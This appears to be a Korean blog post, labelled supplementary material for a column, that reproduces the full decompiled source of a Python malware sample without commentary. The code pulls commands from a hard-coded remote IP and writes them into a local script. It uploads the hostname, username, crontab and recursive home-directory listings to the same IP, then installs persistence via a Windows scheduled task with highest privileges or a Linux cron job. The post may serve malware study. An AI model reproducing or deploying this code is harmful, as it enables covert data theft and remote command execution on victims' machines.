```markdown
---
layout: post
title: "칼럼 보충자료"
categories: [Self-study]
tags: [Python, Code, MultiPartForm, Windows, Linux]
last_modified_at: 2024-09-23
---

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: full.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 2023-04-14 14:32:05 UTC (1681482725)

import os
import subprocess
import urllib.request
from io import BytesIO
import platform
import time
import mimetypes
from urllib.request import urlopen, Request

class MultiPartForm:
    """Accumulate the data to be used when posting a form."""

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = f'------------------------{hex(int(time.time() * 1000))}'

    def get_content_type(self):
        return f'multipart/form-data; boundary={self.boundary}'

    def add_field(self, name, value):
        """Add a simple field to the form data."""  # inserted
        self.form_fields.append((name, value))

    def add_file(self, fieldname, filename, filehandle, mimetype=None):
        """Add a file to be uploaded."""  # inserted
        body = filehandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))

    def __bytes__(self):
        """Return a byte-string representing the form data, including attached files."""  # inserted
        buffer = BytesIO()
        boundary = bytes(self.boundary.encode())
        for name, value in self.form_fields:
            buffer.write(b'--%s\r\n' % boundary)
            buffer.write(b'Content-Disposition: form-data; name="%s"\r\n' % bytes(name.encode()))
            buffer.write(b'\r\n' + bytes(value.encode()) + b'\r\n')
        for fieldname, filename, mimetype, body in self.files:
            buffer.write(b'--%s\r\n' % boundary)
            buffer.write(b'Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (bytes(fieldname.encode()), bytes(filename.encode())))
            buffer.write(b'Content-Type: %s\r\n' % bytes(mimetype.encode()))
            buffer.write(b'\r\n' + body + b'\r\n')
        buffer.write(b'--%s--\r\n' % boundary)
        return buffer.getvalue()

def send_file(file):
    url = 'http://13.51.44.246/upload/'
    form = MultiPartForm()
    form.add_file('file', file, open(file, 'rb'))
    request = Request(url)
    body = bytes(form)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Content-length', len(body))
    request.data = body
    urlopen(request)

def create_windows_task(trigger_interval):
    python_dir = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Programs', 'Python')
    python_versions = [f for f in os.listdir(python_dir) if f.startswith('Python')]
    latest_version = sorted(python_versions)[-1]
    python_path = os.path.join(python_dir, latest_version, 'python.exe')
    task_name = 'My_task'
    script_path = os.path.join(os.path.expanduser('~'), 'locale', 'init.py')
    cmd = f'schtasks /create /tn "{task_name}" /tr "{python_path} {script_path}" /sc minute /mo {trigger_interval} /F /RL HIGHEST /NP'
    subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cmd_enable_task = f'schtasks /run /tn "{task_name}"'
    subprocess.call(cmd_enable_task, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_path():
    try:
        pass
        web = 'http://13.51.44.246/commands'
        response = urllib.request.urlopen(web)
        commands_list = response.read().decode().strip().split('\n')
        if platform.system() == 'Windows':
            user = os.getlogin()
            dir_path = f'C:\\Users\\{user}\\locale'
            if os.path.exists(dir_path):
                return
            os.makedirs(dir_path, exist_ok=True)
            hostname = os.environ['COMPUTERNAME']
            file_path_user = os.path.join(dir_path, f'{user}__{hostname}__user.txt')
            with open(file_path_user, 'w') as f:
                f.write(f'{hostname}@{user}\n')
            script_path = os.path.join(dir_path, 'init.py')
            with open(script_path, 'w') as f:
                for command in commands_list:
                    f.write(command + '\n')
            file_path_all = os.path.join(dir_path, f'{user}__{hostname}__all.txt')
            os.system(f'dir C:\\Users\\{user} /s /b > {file_path_all}')
            send_file(file_path_user)
            send_file(file_path_all)
            os.remove(file_path_user)
            os.remove(file_path_all)
            create_windows_task('1')
        else:  # inserted
            if platform.system() == 'Linux':
                home_dir = os.path.expanduser('~')
                dir_path = os.path.join(home_dir, 'locale')
                if os.path.exists(dir_path):
                    return
                os.makedirs(dir_path, exist_ok=True)
                hostname = subprocess.check_output(['hostname']).decode().strip()
                user = subprocess.check_output(['whoami']).decode().strip()
                crontab_default = subprocess.check_output(['crontab', '-l']).decode().strip()
                file_path_user = os.path.join(dir_path, f'{user}__{hostname}__user.txt')
                with open(file_path_user, 'w') as f:
                    f.write(f'{hostname}@{user}\n')
                script_path = os.path.join(dir_path, 'init.py')
                with open(script_path, 'w') as f:
                    for command in commands_list:
                        f.write(command + '\n')
                file_path_crontab = os.path.join(dir_path, f'{user}__{hostname}__crontab_default.txt')
                with open(file_path_crontab, 'w') as f:
                    f.write(f'{crontab_default}')
                file_path_all = os.path.join(dir_path, f'{user}__{hostname}__all.txt')
                os.system(f'ls -laR /home/{user} >> {file_path_all}')
                send_file(file_path_crontab)
                send_file(file_path_user)
                send_file(file_path_all)
                os.remove(file_path_crontab)
                os.remove(file_path_user)
                os.remove(file_path_all)
                new_cronjob = '*/10 * * * * /usr/bin/python3 {} >> {}/{}run.log 2>&1'.format(script_path, dir_path, f'{user}@{hostname}_')
                subprocess.run(f'(crontab -l ; echo "{new_cronjob}") | crontab -', shell=True)
```
```